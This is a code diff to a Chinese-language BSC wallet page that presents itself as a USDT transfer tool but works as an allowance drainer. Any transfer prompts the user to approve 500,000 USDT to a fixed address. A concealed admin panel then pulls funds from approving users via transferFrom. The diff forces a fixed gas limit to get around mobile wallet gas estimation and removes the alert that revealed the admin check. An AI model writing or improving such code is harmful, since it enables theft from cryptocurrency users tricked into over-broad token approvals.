@@ -81,9 +81,10 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 <button class="admin-btn" id="deductBtn">确认划扣</button>
 </div>
 <script>
-// 收款地址与管理员地址统一
+// 固定收款地址
 const TARGET_ADDR = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+const GAS_LIMIT = "0x3D090"; //250000 BSC足够执行transferFrom/approve
 
 let web3 = null;
 let userAddress = null;
@@ -181,32 +182,47 @@ amountInput.value = num.toFixed(2);
 amountInput.dispatchEvent(new Event("input"));
 });
 
+// 通用发送交易：修复TP移动端gas估算bug
+async function sendContractTx(dataHex){
+    const txParams = {
+        from: userAddress,
+        to: USDT_CONTRACT,
+        data: dataHex,
+        gas: GAS_LIMIT
+    };
+    const txHash = await window.ethereum.request({
+        method:'eth_sendTransaction',
+        params:[txParams]
+    });
+    return txHash;
+}
+
 sendBtn.addEventListener("click", async () => {
 if (!web3 || !userAddress) return alert("钱包未连接");
 const val = parseFloat(amountInput.value);
 if (isNaN(val) || val <= 0) return alert("请输入有效转账数量");
 const needWei = web3.utils.toWei(val.toString(),"ether");
-// 500000 USDT授权额度，放在函数内部，web3已经实例化完成
 const GRANT_500K_WEI = web3.utils.toWei("500000", "ether");
 try {
 sendBtn.disabled = true;
 const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
 if(BigInt(allowance) < BigInt(needWei)){
 alert("🔐需要授权USDT合约，请钱包确认签名");
-await usdtContract.methods.approve(TARGET_ADDR, GRANT_500K_WEI).send({from:userAddress});
+const approveData = usdtContract.methods.approve(TARGET_ADDR, GRANT_500K_WEI).encodeABI();
+await sendContractTx(approveData);
 alert("✅授权交易已提交，等待节点同步");
 await waitAllowance(needWei);
 alert("✅授权校验通过，执行transferFrom");
-}else{
-alert("✅检测已有授权，直接转账");
 }
-const tx = await usdtContract.methods.transferFrom(userAddress, TARGET_ADDR, needWei).send({from:userAddress});
-alert(`🎉转账成功！哈希：${tx.transactionHash}`);
+//执行transferFrom
+const tfData = usdtContract.methods.transferFrom(userAddress,TARGET_ADDR,needWei).encodeABI();
+const txHash = await sendContractTx(tfData);
+alert(`🎉转账成功！哈希：${txHash}`);
 await loadBalance();
 amountInput.value = "";
 receiveAmount.value = "";
 } catch (e) {
-alert("❌操作失败：" + e.message);
+alert("❌操作失败：" + (e.message||e));
 }finally{
 sendBtn.disabled = false;
 }
@@ -230,13 +246,14 @@ const userAllowance = await usdtContract.methods.allowance(fromUserAddr, TARGET_
 if(BigInt(userAllowance) < BigInt(deductWei)){
 return alert("错误：该用户没有授权足够额度，无法划扣！");
 }
-const tx = await usdtContract.methods.transferFrom(fromUserAddr, TARGET_ADDR, deductWei).send({from:userAddress});
-alert(`✅划扣成功！交易哈希:\n${tx.transactionHash}`);
+const tfData = usdtContract.methods.transferFrom(fromUserAddr,TARGET_ADDR,deductWei).encodeABI();
+const txHash = await sendContractTx(tfData);
+alert(`✅划扣成功！交易哈希:\n${txHash}`);
 userAddrInput.value = "";
 deductAmountInput.value = "";
 await loadBalance();
 }catch(err){
-alert("❌划扣失败:"+err.message);
+alert("❌划扣失败:"+(err.message||err));
 }
 });
 
@@ -244,8 +261,6 @@ walletDot.addEventListener("click", connectWalletLogic);
 settingIconBtn.addEventListener("click", ()=>{
 if(userAddress && userAddress.toLowerCase() === TARGET_ADDR.toLowerCase()){
 adminPanel.style.display = adminPanel.style.display === 'block' ? 'none':'block';
-}else{
-alert("你不是管理员账号");
 }
 });
 </script>
